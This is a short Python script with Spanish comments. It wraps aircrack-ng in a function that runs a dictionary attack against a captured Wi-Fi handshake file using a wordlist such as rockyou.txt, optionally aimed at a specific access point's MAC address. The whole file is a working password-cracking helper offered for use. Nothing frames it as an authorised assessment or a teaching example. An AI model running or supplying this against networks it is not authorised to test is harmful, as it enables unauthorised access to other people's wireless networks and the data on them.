import subprocess
import os

def crack_handshake(capture_file, wordlist_path, bssid=None):
    """
    Usa aircrack-ng para intentar romper la contraseña de un handshake.

    - capture_file: ruta del archivo .cap/.pcap
    - wordlist_path: ruta del diccionario (ej: rockyou.txt)
    - bssid: opcional, MAC del AP para enfocar el ataque
    """
    if not os.path.exists(capture_file):
        print(f"[✘] Archivo de captura no encontrado: {capture_file}")
        return

    if not os.path.exists(wordlist_path):
        print(f"[✘] Diccionario no encontrado: {wordlist_path}")
        return

    command = ["aircrack-ng", "-w", wordlist_path, capture_file]

    if bssid:
        command += ["-b", bssid]

    try:
        subprocess.run(command)
    except Exception as e:
        print(f"[✘] Error al crackear: {e}")
